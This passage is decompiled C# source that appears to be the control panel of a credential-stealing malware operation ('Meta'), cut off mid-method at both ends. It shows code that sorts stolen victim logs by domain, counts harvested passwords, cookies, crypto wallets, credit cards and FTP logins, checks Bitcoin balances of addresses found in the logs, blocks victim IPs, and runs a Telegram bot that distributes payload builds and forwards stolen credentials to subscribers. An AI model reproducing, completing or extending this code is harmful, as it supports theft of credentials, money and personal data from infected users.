                    ofd.InitialDirectory = Directory.GetCurrentDirectory();
                    ofd.RestoreDirectory = true;
                    ofd.Multiselect = false;
                    Invoke((MethodInvoker)delegate
                    {
                        if (ofd.ShowDialog(this) == DialogResult.OK)
                        {
                            string[] array = System.IO.File.ReadAllLines(ofd.FileName);
                            foreach (string item in array)
                            {
                                ((ListBox)getFilesSettingsLb).Items.Add(item);
                            }
                        }
                    });
                }
                finally
                {
                    if (ofd != null)
                    {
                        ((IDisposable)ofd).Dispose();
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(this, "Error: " + ex.Message);
            }
        });
    }

    private void toolStripMenuItem2_Click(object sender, object e)
    {
        ((ListBox)cd).Items.RemoveAt(((ListControl)cd).SelectedIndex);
    }

    private void blackListCms_1_Opening(object sender, object e)
    {
        ((CancelEventArgs)e).Cancel = ((ListBox)cd).SelectedItems.Count == 0;
    }

    private void addDomainPatternBtn_Click(object sender, object e)
    {
        if (string.IsNullOrWhiteSpace(((AnimaTextBox)domainDetectorTb).Text))
        {
            MessageBox.Show(this, "Please enter a domain pattern");
            return;
        }
        ((ListBox)cd).Items.Add(((AnimaTextBox)domainDetectorTb).Text);
        ((AnimaTextBox)domainDetectorTb).Text = string.Empty;
    }

    private async void domainDetectorImportBtn_Click(object sender, object e)
    {
        await Task.Factory.StartNew(delegate
        {
            try
            {
                OpenFileDialog ofd = new OpenFileDialog();
                try
                {
                    ofd.Filter = "Txt files (*.txt)|*.txt";
                    ofd.CheckPathExists = true;
                    ofd.InitialDirectory = Directory.GetCurrentDirectory();
                    ofd.RestoreDirectory = true;
                    ofd.Multiselect = false;
                    Invoke((MethodInvoker)delegate
                    {
                        if (ofd.ShowDialog(this) == DialogResult.OK)
                        {
                            string[] array = System.IO.File.ReadAllLines(ofd.FileName);
                            foreach (string item in array)
                            {
                                ((ListBox)cd).Items.Add(item);
                            }
                        }
                    });
                }
                finally
                {
                    if (ofd != null)
                    {
                        ((IDisposable)ofd).Dispose();
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(this, "Error: " + ex.Message);
            }
        });
    }

    private async void runtimeExceptionToolStripMenuItem_Click(object sender, object e)
    {
        int selectedItem = (int)((DataGridView)logsListView).SelectedRows[0].Cells[0].Value;
        await Task.Factory.StartNew(delegate
        {
            try
            {
                UserLog userLog = LazyLoader<UserLogsDb>.Instance.LoadBody(selectedItem);
                if (userLog.Exceptions != null && userLog.Exceptions.Count > 0)
                {
                    new ExceptionsViewer(userLog.Exceptions).ShowDialog(this);
                }
                else
                {
                    MessageBox.Show(this, "Not found");
                }
                userLog = default(UserLog);
            }
            catch (Exception ex)
            {
                MessageBox.Show(this, "Error: " + ex.ToString());
            }
        });
    }

    private void method_6(object sender, object e)
    {
        try
        {
            using OpenFileDialog openFileDialog = new OpenFileDialog();
            openFileDialog.Multiselect = false;
            openFileDialog.RestoreDirectory = true;
            if (openFileDialog.ShowDialog() == DialogResult.OK)
            {
                string input = System.IO.File.ReadAllText(openFileDialog.FileName);
                Regex regex = new Regex("\\b(bc1|[13])[a-zA-HJ-NP-Z0-9]{26,35}\\b");
                if (!regex.IsMatch(input))
                {
                    MessageBox.Show(this, "BTC adress not found");
                    return;
                }
                Match match = regex.Match(input);
                double num = (double)new WebClient().DownloadString("https://api.blockcypher.com/v1/btc/main/addrs/" + match).FromJSON<BtcBalanceRoot>().final_balance / 100000000.0;
                MessageBox.Show($"Balance: {num} BTC");
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show(this, "Error: " + ex.ToString());
        }
    }

    private void logsListView_DataError(object sender, object e)
    {
        try
        {
            ((DataGridViewDataErrorEventArgs)e).ThrowException = false;
            ((CancelEventArgs)e).Cancel = false;
        }
        catch
        {
        }
    }

    private void a4_Click(object sender, object e)
    {
        ((ListBox)blackListIPsLb).Items.RemoveAt(((ListControl)blackListIPsLb).SelectedIndex);
    }

    private void a3_Opening(object sender, object e)
    {
        ((CancelEventArgs)e).Cancel = ((ListBox)blackListIPsLb).SelectedItems.Count == 0;
    }

    private void addBlackIPBtn_Click(object sender, object e)
    {
        if (string.IsNullOrWhiteSpace(((AnimaTextBox)blackIPTb).Text))
        {
            MessageBox.Show(this, "Please enter an IP");
            return;
        }
        ((ListBox)blackListIPsLb).Items.Add(((AnimaTextBox)blackIPTb).Text);
        ((AnimaTextBox)blackIPTb).Text = string.Empty;
    }

    private async void importIPs_Click(object sender, object e)
    {
        await Task.Factory.StartNew(delegate
        {
            try
            {
                OpenFileDialog ofd = new OpenFileDialog();
                try
                {
                    ofd.Filter = "Txt files (*.txt)|*.txt";
                    ofd.CheckPathExists = true;
                    ofd.InitialDirectory = Directory.GetCurrentDirectory();
                    ofd.RestoreDirectory = true;
                    ofd.Multiselect = false;
                    Invoke((MethodInvoker)delegate
                    {
                        if (ofd.ShowDialog(this) == DialogResult.OK)
                        {
                            string[] array = System.IO.File.ReadAllLines(ofd.FileName);
                            foreach (string item in array)
                            {
                                ((ListBox)blackListIPsLb).Items.Add(item);
                            }
                        }
                    });
                }
                finally
                {
                    if (ofd != null)
                    {
                        ((IDisposable)ofd).Dispose();
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(this, "Error: " + ex.Message);
            }
        });
    }

    private void method_7(object sender, object e)
    {
        Process.Start("https://t.me/spectrcrypt_bot");
    }

    private async void ad_Click(object sender, object e)
    {
        ((MetroSetButton)this.m_ad).Enabled = false;
        if (string.IsNullOrWhiteSpace(((AnimaTextBox)this.m_ae).Text))
        {
            MessageBox.Show(this, "Please, enter a domains");
        }
        else if (!string.IsNullOrWhiteSpace(((AnimaTextBox)f5).Text))
        {
            string[] domains = ((AnimaTextBox)this.m_ae).Text.Split(new string[1] { Environment.NewLine }, StringSplitOptions.RemoveEmptyEntries);
            SingleSearchParams singleSearch = new SingleSearchParams
            {
                SaveAccounts = true,
                SavingFormat = ((AnimaTextBox)f5).Text,
                LogFrom = ((DateTimePicker)d5).Value,
                LogTo = ((DateTimePicker)d6).Value
            };
            await Task.Factory.StartNew(delegate
            {
                try
                {
                    FolderSelectDialog folderSelectDialog = new FolderSelectDialog
                    {
                        InitialDirectory = Directory.GetCurrentDirectory(),
                        Title = "Choose directory to save logs"
                    };
                    if (folderSelectDialog.Show(base.Handle))
                    {
                        string[] array = domains;
                        foreach (string domain in array)
                        {
                            Invoke((MethodInvoker)delegate
                            {
                                ((Control)this.m_ab).Text = domain;
                            });
                            singleSearch.PasswordDomain = domain;
                            LogSorter logSorter = new LogSorter(folderSelectDialog.FileName, singleSearch);
                            logSorter.OnIndexChanged = (CurrentIndexChangedEventHandler)Delegate.Combine(logSorter.OnIndexChanged, (CurrentIndexChangedEventHandler)delegate (uint index, uint total)
                            {
                                MainFrm mainFrm = this;
                                int index = (int)index;
                                int total = (int)total;
                                Invoke((MethodInvoker)delegate
                                {
                                    ((Control)mainFrm.m_af).Text = $"{index} / {total}";
                                });
                            });
                            logSorter.Sort();
                        }
                        Invoke((MethodInvoker)delegate
                        {
                            ((Control)this.m_af).Text = "Waiting";
                            ((Control)this.m_ab).Text = "None";
                        });
                        MessageBox.Show(this, "Success");
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show(this, "Error: " + ex.ToString());
                }
            });
        }
        else
        {
            MessageBox.Show(this, "Please, enter a format");
        }
        ((MetroSetButton)this.m_ad).Enabled = true;
    }

    private async void b3_Click(object sender, object e)
    {
        method_8();
    }

    private async void method_8()
    {
        try
        {
            if (((Control)this.m_b3).Text == "Start")
            {
                if (string.IsNullOrWhiteSpace(((AnimaTextBox)this.m_b6).Text))
                {
                    MessageBox.Show(this, "Please, enter an API Token");
                    return;
                }
                lock (settingsLock)
                {
                    RemoteClientSettings.TelegramBotToken = ((AnimaTextBox)this.m_b6).Text;
                    RemoteClientSettings.SaveSettings();
                }
                object_4 = new TelegramBotClient(RemoteClientSettings.TelegramBotToken);
                ((TelegramBotClient)object_4).OnUpdate += OnUpdate;
                if (!(await ((TelegramBotClient)object_4).TestApiAsync(default(CancellationToken))))
                {
                    MessageBox.Show(this, "TestAPI not passed.");
                    return;
                }
                ((TelegramBotClient)object_4).SetWebhookAsync("", (InputFileStream)null, (string)null, 0, (IEnumerable<UpdateType>)null, dropPendingUpdates: false, default(CancellationToken)).Wait();
                ((TelegramBotClient)object_4).StartReceiving((UpdateType[])null, default(CancellationToken));
                ((Control)this.m_b4).Text = "Working";
                ((Control)this.m_b3).Text = "Stop";
            }
            else
            {
                ((TelegramBotClient)object_4)?.StopReceiving();
                object_4 = null;
                ((Control)this.m_b4).Text = "Waiting";
                ((Control)this.m_b3).Text = "Start";
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show(this, "Error: " + ex.ToString());
        }
    }

    public async void StartCommand(Update update)
    {
        bool flag = ((TelegramChatsDb)e).chatsSettings.ToArray().Any((TelegramChatSettings x) => x.ChatId == update.Message.Chat.Id && x.BuildAccess);
        ReplyKeyboardMarkup replyKeyboardMarkup = new ReplyKeyboardMarkup();
        replyKeyboardMarkup.Keyboard = ((!flag) ? new KeyboardButton[1][] { new KeyboardButton[2]
        {
            new KeyboardButton("\ud83d\udc68\u200d\ud83d\udcbb Request access"),
            new KeyboardButton("\ud83d\udcca Statistic")
        } } : new KeyboardButton[3][]
        {
            new KeyboardButton[2]
            {
                new KeyboardButton("\ud83d\udc68\u200d\ud83d\udcbb Request access"),
                new KeyboardButton("\ud83d\udcca Statistic")
            },
            new KeyboardButton[1]
            {
                new KeyboardButton("\ud83d\udd10 Build with user id")
            },
            new KeyboardButton[1]
            {
                new KeyboardButton("\ud83d\udd10 Build with string")
            }
        });
        replyKeyboardMarkup.ResizeKeyboard = true;
        ReplyKeyboardMarkup replyMarkup = replyKeyboardMarkup;
        if (update.Message.Text.Trim() == "/start")
        {
            await ((TelegramBotClient)object_4).PreSafeSendTextMessage(update.Message.Chat.Id, "Welcome to Meta Bot. You have to request access to get logs.", ParseMode.Default, null, disableWebPagePreview: false, disableNotification: false, 0, allowSendingWithoutReply: false, replyMarkup);
        }
        else
        {
            await ((TelegramBotClient)object_4).PreSafeSendTextMessage(update.Message.Chat.Id, "\ud83d\udc47 Select category", ParseMode.Default, null, disableWebPagePreview: false, disableNotification: false, 0, allowSendingWithoutReply: false, replyMarkup);
        }
    }

    public byte[] BuildById(string id)
    {
        return null;
    }

    public async void BuildByDefaultCommand(Update argument, string buildId = null)
    {
        object CS_0024_003C_003E8__locals0 = new _003C_003Ec__DisplayClass95_0();
        ((_003C_003Ec__DisplayClass95_0)CS_0024_003C_003E8__locals0).argument = argument;
        if (!((TelegramChatsDb)e).chatsSettings.ToArray().Any((TelegramChatSettings x) => x.ChatId == ((_003C_003Ec__DisplayClass95_0)CS_0024_003C_003E8__locals0).argument.Message.Chat.Id && x.BuildAccess))
        {
            await ((TelegramBotClient)object_4).PreSafeSendTextMessage(((_003C_003Ec__DisplayClass95_0)CS_0024_003C_003E8__locals0).argument.Message.Chat.Id, "⛔\ufe0f Now allowed");
            return;
        }
        List<string> list = new List<string>();
        lock (((TelegramChatsDb)e).RootLocker)
        {
            IEnumerable<string> enumerable = ((TelegramChatsDb)e).chatsSettings.Select((TelegramChatSettings x) => x.ChatId.ToString());
            List<string> list2;
            if (enumerable != null)
            {
                list2 = enumerable.ToList();
                if (list2 != null)
                {
                    goto IL_0140;
                }
            }
            list2 = new List<string>();
            goto IL_0140;
        IL_0140:
            list = list2;
        }
        List<string> list3 = new List<string>();
        lock (((TelegramChatsDb)e).RootLocker)
        {
            try
            {
                if (System.IO.File.Exists("blackListChats.ini"))
                {
                    list3.AddRange(System.IO.File.ReadAllLines("blackListChats.ini"));
                }
            }
            catch
            {
            }
        }
        if (!list.Contains(((_003C_003Ec__DisplayClass95_0)CS_0024_003C_003E8__locals0).argument.Message.Chat.Id.ToString()) || list3.Contains(((_003C_003Ec__DisplayClass95_0)CS_0024_003C_003E8__locals0).argument.Message.Chat.Id.ToString()))
        {
            await ((TelegramBotClient)object_4).PreSafeSendTextMessage(((_003C_003Ec__DisplayClass95_0)CS_0024_003C_003E8__locals0).argument.Message.Chat.Id, "⛔\ufe0f Now allowed");
            return;
        }
        if (string.IsNullOrWhiteSpace(buildId))
        {
            buildId = ((_003C_003Ec__DisplayClass95_0)CS_0024_003C_003E8__locals0).argument.Message.Chat.Id.ToString();
        }
        await ((TelegramBotClient)object_4).PreSafeSendTextMessage(((_003C_003Ec__DisplayClass95_0)CS_0024_003C_003E8__locals0).argument.Message.Chat.Id, "Building..");
        byte[] array = BuildById(buildId);
        if (array == null || array.Length == 0)
        {
            await ((TelegramBotClient)object_4).PreSafeSendTextMessage(((_003C_003Ec__DisplayClass95_0)CS_0024_003C_003E8__locals0).argument.Message.Chat.Id, "⛔\ufe0f Error");
            return;
        }
        InputOnlineFile document = new InputOnlineFile(new MemoryStream(array), "file.exe");
        ((TelegramBotClient)object_4).SafeSendDocument(((_003C_003Ec__DisplayClass95_0)CS_0024_003C_003E8__locals0).argument.Message.Chat.Id, document, "✅ Successfully created build").Wait();
    }

    public async void BuildByStringCommand(Update argument)
    {
        if (((TelegramChatsDb)e).chatsSettings.ToArray().Any((TelegramChatSettings x) => x.ChatId == argument.Message.Chat.Id && x.BuildAccess))
        {
            List<string> list = new List<string>();
            lock (((TelegramChatsDb)e).RootLocker)
            {
                IEnumerable<string> enumerable = ((TelegramChatsDb)e).chatsSettings.Select((TelegramChatSettings x) => x.ChatId.ToString());
                List<string> list2;
                if (enumerable != null)
                {
                    list2 = enumerable.ToList();
                    if (list2 != null)
                    {
                        goto IL_00bc;
                    }
                }
                list2 = new List<string>();
                goto IL_00bc;
            IL_00bc:
                list = list2;
            }
            List<string> list3 = new List<string>();
            lock (((TelegramChatsDb)e).RootLocker)
            {
                try
                {
                    if (System.IO.File.Exists("blackListChats.ini"))
                    {
                        list3.AddRange(System.IO.File.ReadAllLines("blackListChats.ini"));
                    }
                }
                catch
                {
                }
            }
            if (!list.Contains(argument.Message.Chat.Id.ToString()) || list3.Contains(argument.Message.Chat.Id.ToString()))
            {
                await ((TelegramBotClient)object_4).PreSafeSendTextMessage(argument.Message.Chat.Id, "⛔\ufe0f Now allowed");
                return;
            }
            if (((Dictionary<long, string>)object_10).ContainsKey(argument.Message.Chat.Id))
            {
                ((Dictionary<long, string>)object_10)[argument.Message.Chat.Id] = "Send build id";
            }
            else
            {
                ((Dictionary<long, string>)object_10).Add(argument.Message.Chat.Id, "Send build id");
            }
            await ((TelegramBotClient)object_4).PreSafeSendTextMessage(argument.Message.Chat.Id, "Send build id");
        }
        else
        {
            await ((TelegramBotClient)object_4).PreSafeSendTextMessage(argument.Message.Chat.Id, "⛔\ufe0f Now allowed");
        }
    }

    public async void StatisticCommand(Update argument)
    {
        List<string> list = new List<string>();
        lock (((TelegramChatsDb)e).RootLocker)
        {
            IEnumerable<string> enumerable = ((TelegramChatsDb)e).chatsSettings.Select((TelegramChatSettings x) => x.ChatId.ToString());
            List<string> list2;
            if (enumerable != null)
            {
                list2 = enumerable.ToList();
                if (list2 != null)
                {
                    goto IL_007c;
                }
            }
            list2 = new List<string>();
            goto IL_007c;
        IL_007c:
            list = list2;
        }
        List<string> list3 = new List<string>();
        lock (((TelegramChatsDb)e).RootLocker)
        {
            try
            {
                if (System.IO.File.Exists("blackListChats.ini"))
                {
                    list3.AddRange(System.IO.File.ReadAllLines("blackListChats.ini"));
                }
            }
            catch
            {
            }
        }
        if (!list.Contains(argument.Message.Chat.Id.ToString()) || list3.Contains(argument.Message.Chat.Id.ToString()))
        {
            await ((TelegramBotClient)object_4).PreSafeSendTextMessage(argument.Message.Chat.Id, "⛔\ufe0f Now allowed");
            return;
        }
        StringBuilder stringBuilder = new StringBuilder();
        lock (this.m_a)
        {
            stringBuilder.AppendLine($"\ud83d\udcda Total logs: {LazyLoader<UserLogsDb>.Instance.Meta_002EMainPanel_002EModels_002EDB_002EDbController_003CTItem_003E_002ECount}");
            stringBuilder.AppendLine($"\ud83d\udddd Passwords: {((StatisticDb)object_8).Passwords}");
            stringBuilder.AppendLine($"\ud83c\udf6a Cookies: {((StatisticDb)object_8).Cookies}");
            stringBuilder.AppendLine($"\ud83d\udcb0 Cold Wallets: {((StatisticDb)object_8).ColdWallets}");
            stringBuilder.AppendLine($"✏\ufe0f AutoFills: {((StatisticDb)object_8).AutoFills}");
            stringBuilder.AppendLine($"\ud83d\udcbe FTPs: {((StatisticDb)object_8).FTPs}");
            stringBuilder.AppendLine($"\ud83d\uddc3 Files: {((StatisticDb)object_8).Files}");
            stringBuilder.AppendLine($"\ud83d\udcb3 Credit cards: {((StatisticDb)object_8).CreditCards}");
        }
        await ((TelegramBotClient)object_4).PreSafeSendTextMessage(argument.Message.Chat.Id, stringBuilder.ToString());
    }

    public async void RequestAccessCommand(Update argument)
    {
        string text;
        try
        {
            Chat chat = await ((TelegramBotClient)object_4).SafeGetChat(new ChatId(argument.Message.Chat.Id));
            text = ((!string.IsNullOrWhiteSpace(chat.Username)) ? ("[Profile](https://t.me/" + chat.Username + ")") : ("[Chat]" + chat.Id));
        }
        catch (Exception)
        {
            text = $"[Chat]{argument.Message.Chat.Id}";
        }
        List<string> list = new List<string>();
        lock (((TelegramChatsDb)e).RootLocker)
        {
            IEnumerable<string> enumerable = ((TelegramChatsDb)e).chatsSettings.Select((TelegramChatSettings x) => x.ChatId.ToString());
            List<string> list2;
            if (enumerable != null)
            {
                list2 = enumerable.ToList();
                if (list2 != null)
                {
                    goto IL_019b;
                }
            }
            list2 = new List<string>();
            goto IL_019b;
        IL_019b:
            list = list2;
        }
        List<string> list3 = new List<string>();
        lock (((TelegramChatsDb)e).RootLocker)
        {
            try
            {
                if (System.IO.File.Exists("blackListChats.ini"))
                {
                    list3.AddRange(System.IO.File.ReadAllLines("blackListChats.ini"));
                }
            }
            catch
            {
            }
        }
        if (list.Contains(argument.Message.Chat.Id.ToString()) || list3.Contains(argument.Message.Chat.Id.ToString()) || MessageBox.Show(this, "Are you sure you want to add chat?\nCalled from " + text, "Verification", MessageBoxButtons.OKCancel) != DialogResult.OK)
        {
            return;
        }
        lock (((TelegramChatsDb)e).RootLocker)
        {
            if (CountOfChats() <= ((TelegramChatsDb)e).chatsSettings.Count)
            {
                MessageBox.Show(this, "Maximum number of chats has been added");
            }
            else
            {
                ((TelegramChatsDb)e).chatsSettings.Add(new TelegramChatSettings
                {
                    ChatId = argument.Message.Chat.Id,
                    MessageFormat = "Номер: {ID}\r\nБилд: {BuildID}\r\nОС: {OS}\r\nIP: {IP}\r\nДанные: {Creds}\r\nСтрана: {Country}",
                    SendingMode = SendingMode.NoAttachments,
                    SearchParams = new SingleSearchParams
                    {
                        LogFrom = DateTime.MinValue,
                        LogTo = DateTime.MaxValue
                    }
                });
                ((TelegramChatsDb)e).SaveSettings();
            }
        }
        UpdateRecipients();
        await ((TelegramBotClient)object_4).PreSafeSendTextMessage(argument.Message.Chat.Id, "✅ Успешно.");
    }

    public void InitCommands()
    {
        ((Dictionary<string, Action<Update>>)object_2).Add("/sub", (Action<Update>)RequestAccessCommand);
        ((Dictionary<string, Action<Update>>)object_2).Add("\ud83d\udc68\u200d\ud83d\udcbb Request access", (Action<Update>)RequestAccessCommand);
        ((Dictionary<string, Action<Update>>)object_2).Add("\ud83d\udcca Statistic", (Action<Update>)StatisticCommand);
        ((Dictionary<string, Action<Update>>)object_2).Add("\ud83d\udd10 Build with user id", (Action<Update>)delegate (object x)
        {
            if (x is null)
            {
                throw new ArgumentNullException(nameof(x));
            }

            BuildByDefaultCommand((Update)x);
        });
        ((Dictionary<string, Action<Update>>)object_2).Add("\ud83d\udd10 Build with string", (Action<Update>)BuildByStringCommand);
        ((Dictionary<string, Action<Update>>)object_2).Add("/start", (Action<Update>)StartCommand);
        ((Dictionary<string, Action<Update>>)object_2).Add("/menu", (Action<Update>)StartCommand);
    }

    public async void OnUpdate(object sender, UpdateEventArgs e)
    {
        object CS_0024_003C_003E8__locals0 = new _003C_003Ec__DisplayClass100_0();
        ((_003C_003Ec__DisplayClass100_0)CS_0024_003C_003E8__locals0).eventArgs = e;
        nint num = 0;
        try
        {
            Telegram.Bot.Types.Message message = ((_003C_003Ec__DisplayClass100_0)CS_0024_003C_003E8__locals0).eventArgs.Update.Message;
            if (message != null && message.Type == MessageType.Text)
            {
                try
                {
                    string text = ((_003C_003Ec__DisplayClass100_0)CS_0024_003C_003E8__locals0).eventArgs.Update.Message.Text.Trim();
                    if (!string.IsNullOrWhiteSpace(text))
                    {
                        if (!((Dictionary<string, Action<Update>>)object_2).ContainsKey(text))
                        {
                            ((TelegramChatsDb)this.e).chatsSettings.ToArray().Any((TelegramChatSettings x) => x.ChatId == ((_003C_003Ec__DisplayClass100_0)CS_0024_003C_003E8__locals0).eventArgs.Update.Message.Chat.Id && x.BuildAccess);
                            string value = ((IEnumerable<KeyValuePair<long, string>>)object_10).FirstOrDefault((KeyValuePair<long, string> x) => x.Key == ((_003C_003Ec__DisplayClass100_0)CS_0024_003C_003E8__locals0).eventArgs.Update.Message.Chat.Id).Value;
                            if (string.IsNullOrWhiteSpace(value))
                            {
                                await ((TelegramBotClient)object_4).PreSafeSendTextMessage(((_003C_003Ec__DisplayClass100_0)CS_0024_003C_003E8__locals0).eventArgs.Update.Message.Chat.Id, "⛔\ufe0f Select command");
                            }
                            else if (value == "Send build id")
                            {
                                BuildByDefaultCommand(((_003C_003Ec__DisplayClass100_0)CS_0024_003C_003E8__locals0).eventArgs.Update, text);
                            }
                        }
                        else
                        {
                            ((Dictionary<string, Action<Update>>)object_2)[text](((_003C_003Ec__DisplayClass100_0)CS_0024_003C_003E8__locals0).eventArgs.Update);
                        }
                        return;
                    }
                }
                catch (Exception)
                {
                    return;
                }
                await ((TelegramBotClient)object_4).PreSafeSendTextMessage(((_003C_003Ec__DisplayClass100_0)CS_0024_003C_003E8__locals0).eventArgs.Update.Message.Chat.Id, "⛔\ufe0f Unknown command");
            }
        }
        catch
        {
            num = 1;
        }
        int num2 = (int)num;
        if (num2 == 1)
        {
            await ((TelegramBotClient)object_4).PreSafeSendTextMessage(((_003C_003Ec__DisplayClass100_0)CS_0024_003C_003E8__locals0).eventArgs.Update.Message.Chat.Id, "⛔\ufe0f Error");
        }
    }

    public async void UpdateRecipients()
    {
        await Task.Factory.StartNew(delegate
        {
            ((ListBox)recipientsIdsListBox).Items.Clear();
            lock (((TelegramChatsDb)e).RootLocker)
            {
                string[] chatIds = ((TelegramChatsDb)e).chatsSettings.Select((TelegramChatSettings x) => x.ChatId.ToString())?.ToArray();
                Invoke((MethodInvoker)delegate
                {
                    ListBox.ObjectCollection items = ((ListBox)recipientsIdsListBox).Items;
                    object[] items2 = chatIds ?? new string[0];
                    items.AddRange(items2);
                });
            }
        });
    }

    private async void c0_Click(object sender, object e)
    {
        ((MetroSetButton)createBuildBtn).Enabled = false;
        ((MetroSetButton)c0).Enabled = false;
        ((Control)c0).Text = "Checking";
        string text = ((AnimaTextBox)serverIpTb).Text;
        if (string.IsNullOrWhiteSpace(text))
        {
            MessageBox.Show(this, "Enter a server ip");
            ((Control)c0).Text = "Check connection";
            ((MetroSetButton)c0).Enabled = true;
            ((MetroSetButton)createBuildBtn).Enabled = true;
            return;
        }
        string[] ips = text.Split('|');
        string[] array = ips;
        foreach (string text2 in array)
        {
            if (!IPAddress.TryParse(text2, out var _) && !new Regex("^((?!-)[A-Za-z0-9-]{1,63}(?<!-)\\.)+[A-Za-z]{2,6}$").IsMatch(text2))
            {
                MessageBox.Show(this, "'" + text2 + "' is invalid address");
                ((Control)c0).Text = "Check connection";
                ((MetroSetButton)c0).Enabled = true;
                ((MetroSetButton)createBuildBtn).Enabled = true;
                return;
            }
        }
        await Task.Factory.StartNew(delegate
        {
        });
        ((Control)c0).Text = "Check connection";
        ((MetroSetButton)c0).Enabled = true;
        ((MetroSetButton)createBuildBtn).Enabled = true;
    }

    private void c5_Click(object sender, object e)
    {
        try
        {
            Show();
            ((NotifyIcon)c3).Visible = false;
        }
        catch
        {
        }
    }

    private void c6_Click(object sender, object e)
    {
        Environment.Exit(0);
    }

    private async void c7_Click(object sender, object e)
    {
        string password = Interaction.InputBox("Enter a password:", "Meta Locker", null);
        if (string.IsNullOrWhiteSpace(password))
        {
            return;
        }
        await Task.Factory.StartNew(delegate
        {
            Hide();
            while (new LockFrm(password).ShowDialog(this) != DialogResult.OK)
            {
            }
            Show();
        });
    }

    private async void d2_Click(object sender, object e)
    {
        try
        {
            if (((DataGridView)logsListView).SelectedRows.Count <= 0)
            {
                return;
            }
            object enumerator = ((DataGridView)logsListView).SelectedRows.GetEnumerator();
            try
            {
                while (((IEnumerator)enumerator).MoveNext())
                {
                    DataGridViewRow dataGridViewRow = (DataGridViewRow)((IEnumerator)enumerator).Current;
                    int selectedItem = (int)dataGridViewRow.Cells[0].Value;
                    await Task.Factory.StartNew(delegate
                    {
                        try
                        {
                            UserLog userLog = LazyLoader<UserLogsDb>.Instance.Find((UserLog x) => x.ID == selectedItem);
                            Invoke((MethodInvoker)delegate
                            {
                                ((ListBox)blackListIPsLb).Items.Add(userLog.IP);
                            });
                            lock (settingsLock)
                            {
                                RemoteClientSettings.BlackListedIPS.Add(userLog.IP);
                            }
                            userLog = default(UserLog);
                        }
                        catch
                        {
                        }
                    });
                    lock (settingsLock)
                    {
                        RemoteClientSettings.SaveSettings();
                    }
                }
            }
            finally
            {
                if (enumerator is IDisposable disposable)
                {
                    disposable.Dispose();
                }
            }
            MessageBox.Show(this, "Successfully blocked");
        }
        catch (Exception ex)
        {
            MessageBox.Show(this, "Error: " + ex.Message);
        }
    }

    private void d3_Click(object sender, object e)
    {
        try
        {
            string text = Interaction.InputBox("Edit value:", "Meta Edit", ((ListBox)getFilesSettingsLb).Items[((ListControl)getFilesSettingsLb).SelectedIndex].ToString());
            if (!string.IsNullOrWhiteSpace(text) && ((ListBox)getFilesSettingsLb).Items[((ListControl)getFilesSettingsLb).SelectedIndex].ToString() != text)
            {
                ((ListBox)getFilesSettingsLb).Items[((ListControl)getFilesSettingsLb).SelectedIndex] = text;
                MessageBox.Show(this, "Successfully");
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show(this, "Error: " + ex.Message);
        }
    }

    private void d4_Click(object sender, object e)
    {
        try
        {
            string text = Interaction.InputBox("Edit value:", "Meta Edit", ((ListBox)cd).Items[((ListControl)cd).SelectedIndex].ToString());
            if (!string.IsNullOrWhiteSpace(text) && ((ListBox)cd).Items[((ListControl)cd).SelectedIndex].ToString() != text)
            {
                ((ListBox)cd).Items[((ListControl)cd).SelectedIndex] = text;
                MessageBox.Show(this, "Successfully");
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show(this, "Error: " + ex.Message);
        }
    }

    private void d8_Click(object sender, object e)
    {
        try
        {
            int num = LazyLoader<UserLogsDb>.Instance.PageController.CurrentPage + 1;
            if (num >= 0 && num < LazyLoader<UserLogsDb>.Instance.PageController.PagesCount)
            {
                LazyLoader<UserLogsDb>.Instance.PageController.CurrentPage = num;
            }
        }
        catch
        {
        }
    }

    private void da_Click(object sender, object e)
    {
        try
        {
            int result;
            if (string.IsNullOrWhiteSpace(((AnimaTextBox)d9).Text))
            {
                MessageBox.Show(this, "Enter a number of page");
            }
            else if (int.TryParse(((AnimaTextBox)d9).Text, out result))
            {
                if (result < 0)
                {
                    MessageBox.Show("The number must be positive");
                }
                else if (result > LazyLoader<UserLogsDb>.Instance.PageController.Pages.Count)
                {
                    MessageBox.Show("The number must be equal to or less than " + LazyLoader<UserLogsDb>.Instance.PageController.Pages.Count);
                }
                else
                {
                    LazyLoader<UserLogsDb>.Instance.PageController.CurrentPage = result - 1;
                }
            }
        }
        catch
        {
        }
    }

    private void d7_Click(object sender, object e)
    {
        try
        {
            int num = LazyLoader<UserLogsDb>.Instance.PageController.CurrentPage - 1;
            if (num >= 0 && num < LazyLoader<UserLogsDb>.Instance.PageController.PagesCount)
            {
                LazyLoader<UserLogsDb>.Instance.PageController.CurrentPage = num;
            }
        }
        catch
        {
        }
    }

    private void e5_Click(object sender, object e)
    {
        FolderSelectDialog folderSelectDialog = new FolderSelectDialog
        {
            InitialDirectory = Directory.GetCurrentDirectory(),
            Title = "Choose directory to save logs"
        };
        if (folderSelectDialog.Show(base.Handle))
        {
            ((AnimaTextBox)e6).Text = folderSelectDialog.FileName;
        }
    }

    private async void e9_Click(object sender, object e)
    {
        ((MetroSetButton)saveDiscordTokensBtn).Enabled = false;
        ((MetroSetButton)singleSort).Enabled = false;
        ((MetroSetButton)e9).Enabled = false;
        ((MetroSetButton)e8).Enabled = false;
        ((MetroSetButton)ee).Enabled = false;
        await Task.Factory.StartNew(delegate
        {
            try
            {
                LazyLoader<UserLogsDb>.Instance.PageController.Pages[LazyLoader<UserLogsDb>.Instance.PageController.CurrentPage].RaiseListChangedEvents = false;
                LazyLoader<UserLogsDb>.Instance.DbInstance.RaiseListChangedEvents = false;
                UserLog[] source;
                lock (LazyLoader<UserLogsDb>.Instance.DataBaseLock)
                {
                    source = LazyLoader<UserLogsDb>.Instance.DbInstance.ToArray();
                }
                BindingList<UserLog> bindingList = new BindingList<UserLog> { source.Where((UserLog x) => x.Creds == "0|0|0|0") };
                foreach (UserLog newLog in bindingList)
                {
                    LazyLoader<UserLogsDb>.Instance.Delete((UserLog x) => x.ID == newLog.ID);
                }
                LazyLoader<UserLogsDb>.Instance.DbInstance.RaiseListChangedEvents = true;
                LazyLoader<UserLogsDb>.Instance.DbInstance.ResetBindings();
                LazyLoader<UserLogsDb>.Instance.PageController.Clear();
                LazyLoader<UserLogsDb>.Instance.PageController.FillData(LazyLoader<UserLogsDb>.Instance.DbInstance);
